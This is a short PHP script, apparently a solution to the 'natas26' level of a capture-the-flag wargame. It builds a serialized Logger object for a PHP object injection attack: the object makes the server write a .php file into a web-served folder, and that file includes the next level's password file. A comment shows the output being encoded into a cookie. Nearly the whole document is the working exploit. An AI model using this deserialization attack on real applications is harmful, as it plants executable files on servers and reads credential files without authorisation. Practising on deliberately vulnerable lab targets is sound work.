<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct()
    {
        $this->exitMsg = '<?php include("/etc/natas_webpass/natas27") ?>';
        $this->logFile = "img/asd.php";
    }
}

echo serialize(new Logger);
// COOKIE=`php natas26.php | base64 -w0 | urlencode`
?>